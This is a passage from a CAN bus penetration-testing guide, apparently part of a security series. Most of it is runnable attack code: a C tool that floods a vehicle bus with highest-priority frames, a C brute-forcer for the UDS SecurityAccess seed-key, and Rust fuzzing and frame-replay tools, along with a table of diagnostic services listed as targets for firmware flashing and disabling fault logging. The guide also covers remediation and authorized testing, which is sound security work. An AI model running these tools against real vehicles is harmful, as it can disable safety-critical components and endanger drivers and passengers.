#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

static volatile int running = 1;
void sig_handler(int s) { (void)s; running = 0; }

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <iface>\n", argv[0]); return 1; }

    int sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_can addr = { AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    struct can_frame frame;
    memset(&frame, 0, sizeof(frame));
    frame.can_id  = 0x000;   /* Highest priority on CAN bus */
    frame.can_dlc = 8;
    memset(frame.data, 0xFF, 8);

    signal(SIGINT, sig_handler);
    printf("[*] Flooding bus with priority 0x000 frames. Ctrl-C to stop.\n");

    uint64_t count = 0;
    while (running) {
        write(sock, &frame, sizeof(frame));
        count++;
    }

    printf("[+] Sent %llu frames.\n", (unsigned long long)count);
    close(sock);
    return 0;
}
```

---

## Diagnostic Protocol Exploitation

Modern vehicles use **ISO 14229 (UDS — Unified Diagnostic Services)** over CAN for programming, configuration, and diagnostics. Insecure implementations are a rich target.

### Key UDS Services to Test

| Service ID | Name | Pen Test Focus |
|---|---|---|
| 0x10 | DiagnosticSessionControl | Escalate to Programming Session |
| 0x11 | ECUReset | Trigger unexpected reboots |
| 0x22 | ReadDataByIdentifier | Extract VIN, keys, configs |
| 0x27 | SecurityAccess | Bypass seed/key authentication |
| 0x2E | WriteDataByIdentifier | Tamper with calibration data |
| 0x31 | RoutineControl | Trigger arbitrary routines |
| 0x34/0x36 | RequestDownload / TransferData | Flash unauthorized firmware |
| 0x85 | ControlDTCSetting | Disable fault logging |

### C/C++ — UDS SecurityAccess Brute-Force

```c
/*
 * uds_secaccess.c — Brute-force UDS SecurityAccess (0x27) seed-key.
 *
 * Many ECUs use weak seed-key algorithms (XOR, addition, rotation).
 * This tool requests seeds and tries all 16-bit keys.
 *
 * Functional address: 0x7DF (broadcast)
 * ECU response:       0x7E8 (typical powertrain ECU)
 *
 * Build: gcc -o uds_secaccess uds_secaccess.c
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

#define UDS_REQUEST_ID   0x7DF
#define UDS_RESPONSE_ID  0x7E8
#define SID_SEC_ACCESS   0x27
#define ACCESS_LEVEL     0x01

static int sock;

static void send_uds(uint8_t *data, uint8_t len) {
    struct can_frame f;
    memset(&f, 0, sizeof(f));
    f.can_id  = UDS_REQUEST_ID;
    f.can_dlc = len + 1;        /* ISO 15765-2 single frame: length byte */
    f.data[0] = len;            /* PCI byte: single frame, data length */
    memcpy(f.data + 1, data, len);
    write(sock, &f, sizeof(f));
}

/* Returns 1 if a valid response frame for response_sid was received */
static int recv_uds(uint8_t response_sid, uint8_t *out, int *out_len,
                    int timeout_ms) {
    struct timeval tv = { 0, timeout_ms * 1000 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    struct can_frame f;
    while (read(sock, &f, sizeof(f)) > 0) {
        if ((f.can_id & CAN_EFF_MASK) != UDS_RESPONSE_ID) continue;
        if (f.data[1] == response_sid) {
            *out_len = f.data[0];
            memcpy(out, f.data + 1, *out_len);
            return 1;
        }
        if (f.data[1] == 0x7F) {  /* Negative response */
            printf("  [NRC] Service=0x%02X NRC=0x%02X\n", f.data[2], f.data[3]);
            return 0;
        }
    }
    return 0;   /* Timeout */
}

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <iface>\n", argv[0]); return 1; }

    sock = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    struct ifreq ifr;
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
    ioctl(sock, SIOCGIFINDEX, &ifr);
    struct sockaddr_can addr = { AF_CAN, ifr.ifr_ifindex };
    bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    printf("[*] Requesting UDS SecurityAccess seed (Level 0x%02X)...\n", ACCESS_LEVEL);

    /* Step 1: Request seed */
    uint8_t req_seed[] = { SID_SEC_ACCESS, ACCESS_LEVEL };
    send_uds(req_seed, sizeof(req_seed));

    uint8_t resp[7]; int rlen;
    if (!recv_uds(SID_SEC_ACCESS + 0x40, resp, &rlen, 200)) {
        printf("[-] No seed response.\n"); return 1;
    }

    uint16_t seed = (uint16_t)((resp[2] << 8) | resp[3]);
    printf("[+] Received seed: 0x%04X\n", seed);

    /* Step 2: Brute-force all 16-bit keys */
    printf("[*] Brute-forcing keys 0x0000–0xFFFF...\n");
    for (uint32_t key = 0; key <= 0xFFFF; key++) {
        uint8_t req_key[] = {
            SID_SEC_ACCESS, ACCESS_LEVEL + 1,   /* SendKey subfunction */
            (uint8_t)(key >> 8), (uint8_t)(key & 0xFF)
        };
        send_uds(req_key, sizeof(req_key));

        if (recv_uds(SID_SEC_ACCESS + 0x40, resp, &rlen, 50)) {
            printf("[!!!] KEY FOUND: 0x%04X for seed 0x%04X\n",
                   (uint16_t)key, seed);
            break;
        }

        if ((key & 0xFFF) == 0)
            printf("[*]  ... tried 0x%04X\n", (uint16_t)key);
    }

    close(sock);
    return 0;
}
```

---

## Rust Tooling for CAN Pen Testing

Rust's memory safety and zero-cost abstractions make it an excellent language for reliable, high-performance CAN security tools. The `socketcan` crate provides idiomatic SocketCAN bindings.

### Rust — CAN Bus Reconnaissance Tool

```toml
# Cargo.toml
[package]
name    = "can_pentest"
version = "0.1.0"
edition = "2021"

[dependencies]
socketcan   = "3"
clap        = { version = "4", features = ["derive"] }
anyhow      = "1"
```

```rust
// src/bin/recon.rs — CAN bus reconnaissance in Rust
//
// Usage: cargo run --bin recon -- --iface can0 --duration 10

use anyhow::Result;
use clap::Parser;
use socketcan::{CanSocket, Socket};
use std::{
    collections::HashMap,
    time::{Duration, Instant},
};

#[derive(Parser)]
struct Args {
    #[arg(short, long, default_value = "can0")]
    iface: String,
    #[arg(short, long, default_value_t = 10)]
    duration: u64,
}

#[derive(Debug)]
struct IdStats {
    count:     u64,
    dlc:       u8,
    last_data: Vec<u8>,
}

fn main() -> Result<()> {
    let args = Args::parse();
    let socket = CanSocket::open(&args.iface)?;
    socket.set_read_timeout(Duration::from_millis(100))?;

    let mut stats: HashMap<u32, IdStats> = HashMap::new();
    let deadline = Instant::now() + Duration::from_secs(args.duration);

    println!("[*] Sniffing {} for {} seconds...", args.iface, args.duration);

    while Instant::now() < deadline {
        match socket.read_frame() {
            Ok(frame) => {
                use socketcan::EmbeddedFrame;
                let id = frame.raw_id();
                let data = frame.data().to_vec();
                let entry = stats.entry(id).or_insert(IdStats {
                    count:     0,
                    dlc:       data.len() as u8,
                    last_data: vec![],
                });
                entry.count    += 1;
                entry.dlc       = data.len() as u8;
                entry.last_data = data;
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
            Err(e) => eprintln!("read error: {e}"),
        }
    }

    println!("\n[+] CAN ID Discovery Report ({} unique IDs)\n", stats.len());
    println!("{:<12} {:<8} {:<10} {}", "CAN-ID", "DLC", "Count", "Last Data");
    println!("{:-<12} {:-<8} {:-<10} {:-<23}", "", "", "", "");

    let mut ids: Vec<_> = stats.iter().collect();
    ids.sort_by_key(|(id, _)| *id);

    for (id, s) in ids {
        let hex: Vec<String> = s.last_data.iter().map(|b| format!("{b:02X}")).collect();
        println!("0x{id:03X}        {:<8} {:<10} {}",
                 s.dlc, s.count, hex.join(" "));
    }

    Ok(())
}
```

### Rust — CAN Fuzzer

```rust
// src/bin/fuzzer.rs — CAN bus fuzzer in Rust
//
// Strategies: sweep | mutate | bitflip
// Usage: cargo run --bin fuzzer -- --iface can0 sweep
//        cargo run --bin fuzzer -- --iface can0 mutate --id 0x200 \
//                                  --seed "DEADBEEF00000000" --iterations 500

use anyhow::Result;
use clap::{Parser, Subcommand};
use socketcan::{CanFrame, CanSocket, Socket, EmbeddedFrame, StandardId};
use std::time::Duration;

#[derive(Parser)]
struct Args {
    #[arg(short, long, default_value = "can0")]
    iface: String,
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Sweep all 11-bit CAN IDs with a fixed payload
    Sweep {
        #[arg(long, default_value_t = 8)]
        dlc: usize,
    },
    /// Mutate data bytes for a fixed CAN ID
    Mutate {
        #[arg(long, value_parser = parse_hex_u32)]
        id: u32,
        #[arg(long, default_value = "AAAAAAAAAAAAAAAA")]
        seed: String,
        #[arg(long, default_value_t = 1000)]
        iterations: usize,
    },
    /// Bit-flip each bit in the seed frame for a fixed CAN ID
    Bitflip {
        #[arg(long, value_parser = parse_hex_u32)]
        id: u32,
        #[arg(long, default_value = "AAAAAAAAAAAAAAAA")]
        seed: String,
    },
}

fn parse_hex_u32(s: &str) -> Result<u32, String> {
    let s = s.strip_prefix("0x").unwrap_or(s);
    u32::from_str_radix(s, 16).map_err(|e| e.to_string())
}

fn parse_seed(hex: &str) -> Vec<u8> {
    (0..hex.len())
        .step_by(2)
        .filter_map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect()
}

fn send(sock: &CanSocket, id: u32, data: &[u8]) -> Result<()> {
    let sid = StandardId::new(id as u16).expect("invalid standard ID");
    let frame = CanFrame::new(sid, &data[..data.len().min(8)])
        .ok_or_else(|| anyhow::anyhow!("frame construction failed"))?;
    sock.write_frame(&frame)?;
    Ok(())
}

fn main() -> Result<()> {
    let args = Args::parse();
    let sock = CanSocket::open(&args.iface)?;

    match &args.command {
        Command::Sweep { dlc } => {
            println!("[*] Sweeping 0x000–0x7FF (DLC={dlc})");
            let payload = vec![0xAAu8; *dlc];
            for id in 0u32..=0x7FF {
                send(&sock, id, &payload)?;
                std::thread::sleep(Duration::from_micros(500));
                if id % 0x100 == 0 {
                    println!("[*] Progress: 0x{id:03X}");
                }
            }
            println!("[+] Sweep done.");
        }

        Command::Mutate { id, seed, iterations } => {
            let seed_bytes = parse_seed(seed);
            println!("[*] Mutating ID=0x{id:03X} × {iterations} iterations");
            for i in 0..*iterations {
                let mut data = seed_bytes.clone();
                let mutations = 1 + (rand_u8() as usize % 4);
                for _ in 0..mutations {
                    let pos = rand_u8() as usize % data.len();
                    data[pos] = rand_u8();
                }
                send(&sock, *id, &data)?;
                if i % 100 == 0 {
                    println!("[{i:04}] ID=0x{id:03X} {:02X?}", &data);
                }
                std::thread::sleep(Duration::from_micros(1000));
            }
            println!("[+] Mutation done.");
        }

        Command::Bitflip { id, seed } => {
            let seed_bytes = parse_seed(seed);
            println!("[*] Bit-flip fuzzing ID=0x{id:03X}");
            for byte_idx in 0..seed_bytes.len() {
                for bit in 0..8u8 {
                    let mut data = seed_bytes.clone();
                    data[byte_idx] ^= 1 << bit;
                    println!("[~] byte={byte_idx} bit={bit}: {:02X?}", &data);
                    send(&sock, *id, &data)?;
                    std::thread::sleep(Duration::from_micros(5000));
                }
            }
            println!("[+] Bit-flip done.");
        }
    }

    Ok(())
}

/* Simple LCG pseudo-random — no_std compatible */
fn rand_u8() -> u8 {
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEED: AtomicU64 = AtomicU64::new(0xDEADBEEFCAFEBABE);
    let s = SEED.load(Ordering::Relaxed)
        .wrapping_mul(6364136223846793005)
        .wrapping_add(1442695040888963407);
    SEED.store(s, Ordering::Relaxed);
    (s >> 56) as u8
}
```

### Rust — Replay Attack Tool

```rust
// src/bin/replay.rs — CAN frame recorder and replayer in Rust
//
// Record: cargo run --bin replay -- --iface can0 record --output capture.bin --secs 5
// Replay: cargo run --bin replay -- --iface can0 replay --input  capture.bin

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use socketcan::{CanFrame, CanSocket, Socket, EmbeddedFrame, StandardId};
use std::{
    fs::File,
    io::{BufReader, BufWriter, Read, Write},
    time::{Duration, Instant},
};

#[derive(Parser)]
struct Args {
    #[arg(short, long, default_value = "can0")]
    iface: String,
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    Record {
        #[arg(long)]
        output: String,
        #[arg(long, default_value_t = 5)]
        secs: u64,
    },
    Replay {
        #[arg(long)]
        input: String,
    },
}

/// On-disk record: 8-byte timestamp (µs) + 4-byte raw ID + 1-byte DLC + 8-byte data
#[repr(C, packed)]
struct DiskFrame {
    ts_us: u64,
    raw_id: u32,
    dlc:    u8,
    data:   [u8; 8],
}

fn main() -> Result<()> {
    let args = Args::parse();
    let sock = CanSocket::open(&args.iface)?;

    match &args.command {
        Command::Record { output, secs } => {
            sock.set_read_timeout(Duration::from_millis(100))?;
            let f = File::create(output).context("create output")?;
            let mut w = BufWriter::new(f);
            let start    = Instant::now();
            let deadline = start + Duration::from_secs(*secs);
            let mut count = 0u32;

            println!("[*] Recording {} for {secs}s → {output}", args.iface);

            while Instant::now() < deadline {
                match sock.read_frame() {
                    Ok(frame) => {
                        let ts_us = start.elapsed().as_micros() as u64;
                        let data_slice = frame.data();
                        let mut data = [0u8; 8];
                        data[..data_slice.len()].copy_from_slice(data_slice);

                        let rec = DiskFrame {
                            ts_us,
                            raw_id: frame.raw_id(),
                            dlc:    data_slice.len() as u8,
                            data,
                        };
                        // SAFETY: DiskFrame is POD; writing raw bytes is fine here.
                        let bytes = unsafe {
                            std::slice::from_raw_parts(
                                &rec as *const _ as *const u8,
                                std::mem::size_of::<DiskFrame>(),
                            )
                        };
                        w.write_all(bytes)?;
                        count += 1;
                    }
                    Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {}
                    Err(e) => eprintln!("read: {e}"),
                }
            }

            w.flush()?;
            println!("[+] Recorded {count} frames.");
        }

        Command::Replay { input } => {
            let f = File::open(input).context("open input")?;
            let mut r = BufReader::new(f);

            let frame_size = std::mem::size_of::<DiskFrame>();
            let mut buf = vec![0u8; frame_size];
            let mut frames: Vec<DiskFrame> = Vec::new();

            while r.read_exact(&mut buf).is_ok() {
                let rec: DiskFrame = unsafe {
                    std::ptr::read(buf.as_ptr() as *const DiskFrame)
                };
                frames.push(rec);
            }

            println!("[*] Replaying {} frames from {input}...", frames.len());
            let start = Instant::now();

            for rec in &frames {
                // Busy-wait for correct relative timestamp
                while start.elapsed().as_micros() < rec.ts_us as u128 {}

                if let Some(sid) = StandardId::new((rec.raw_id & 0x7FF) as u16) {
                    let dlc = rec.dlc as usize;
                    if let Some(frame) = CanFrame::new(sid, &rec.data[..dlc]) {
                        let _ = sock.write_frame(&frame);
                        println!("[>] t={:7}µs  ID=0x{:03X}",
                                 rec.ts_us, rec.raw_id & 0x7FF);
                    }
                }
            }

            println!("[+] Replay complete.");
        }
    }

    Ok(())
}
```

---

## Tooling and Hardware

### Software Tools

| Tool | Language | Purpose |
|---|---|---|
| `can-utils` (candump, cansend, cangen) | C | Standard SocketCAN utilities |
| `python-can` | Python | High-level CAN library with many interface backends |
| `scapy` | Python | Packet crafting, supports CAN via `python-can` |
| `Caringcaribou` | Python | Automotive-specific pen test framework (UDS, XCP, DCIM) |
| `CANalyze` | Python | CAN analysis and reverse engineering |
| `ICSim` | C | Instrument cluster simulator for safe practice |
| `OpenXC` | Various | Open vehicle data platform |

### Hardware Interfaces

| Hardware | Interface | Notes |
|---|---|---|
| Peak PCAN-USB | SocketCAN / PCAN | Reliable, professional grade |
| Kvaser Leaf Light | SocketCAN | High-quality Swedish hardware |
| USB2CAN (8devices) | SocketCAN | Low-cost entry point |
| CANtact / CANable | SocketCAN | Open-source, affordable |
| GreatFET One | USB | Flexible SDR/CAN research platform |
| Raspberry Pi + MCP2515 | SPI → SocketCAN | DIY solution; good for test benches |

### Setting Up a SocketCAN Interface

```bash
# Load the SocketCAN kernel modules
modprobe can
modprobe can_raw
modprobe vcan          # For virtual CAN testing

# Physical CAN interface (e.g., Peak PCAN-USB)
ip link set can0 type can bitrate 500000
ip link set up can0

# Virtual CAN (safe practice environment)
ip link add dev vcan0 type vcan
ip link set up vcan0

# Verify
ip link show vcan0
candump vcan0           # Start listening
cansend vcan0 123#DEADBEEF   # Send a test frame
```

---

## Reporting and Remediation

A CAN penetration test report should include:

**1. Executive Summary** — business risk, scope, and key findings in non-technical language.

**2. Technical Findings** — for each vulnerability:
- CAN ID(s) affected
- Attack description and reproduction steps
- Captured traffic evidence
- CVSS score (use AV:P for physical access, AV:N for remote via telematics)
- Risk rating (Critical / High / Medium / Low)

**3. Recommendations** — prioritized remediation:

| Vulnerability | Remediation |
|---|---|
| Unauthenticated message injection | Implement CAN message authentication (AUTOSAR SecOC, CANsec) |
| Weak UDS SecurityAccess | Use NIST-approved CMAC or HMAC seed-key algorithms |
| Bus-Off susceptibility | Deploy CAN guardian / firewall nodes |
| Missing encryption | Adopt CAN-FD with payload encryption for sensitive signals |
| OBD-II exposure | Restrict OBD-II to read-only mode; gate programming sessions |
| No intrusion detection | Deploy Automotive Intrusion Detection System (IDS) |

**4. Retest Plan** — timeline for verifying that fixes were implemented correctly.

---

## Summary

CAN penetration testing is a structured, authorization-driven discipline for uncovering security weaknesses in automotive and industrial CAN networks. The core attack surface arises from CAN's fundamental design assumptions: **no authentication, no encryption, and a shared broadcast medium**.

The principal attack classes are:

- **Passive reconnaissance** — traffic capture and differential analysis to reverse-engineer signals.
- **Message injection** — crafting and transmitting arbitrary CAN frames to manipulate ECU behaviour.
- **Bus-Off attack** — exploiting CAN error handling to disconnect legitimate nodes.
- **Replay attacks** — capturing and re-transmitting authenticated action sequences.
- **Fuzzing** — systematic or random frame generation to trigger unexpected ECU states.
- **ECU impersonation** — spoofing a legitimate node's identity and output.
- **Denial of Service** — flooding the bus with high-priority frames to starve other nodes.
- **UDS/OBD-II exploitation** — abusing diagnostic services to read data, bypass security, or flash firmware.

Both **C/C++** (via Linux SocketCAN) and **Rust** (via the `socketcan` crate) provide the low-level, real-time-capable tooling required for effective CAN security research. Rust's ownership model eliminates entire classes of memory-safety bugs that have historically plagued C-based security tools.

Remediation strategies range from short-term mitigations (restricting OBD-II access, hardening UDS SecurityAccess) to architectural improvements (AUTOSAR SecOC message authentication, CAN-FD with encryption, automotive IDS deployment).

All CAN penetration testing activities must be conducted on isolated test benches or stationary vehicles with **explicit written authorization**, in compliance with applicable law, and followed by responsible disclosure to the system owner.

---

*Document: 99_CAN_Penetration_Testing.md — Part of the CAN Bus Security Series*
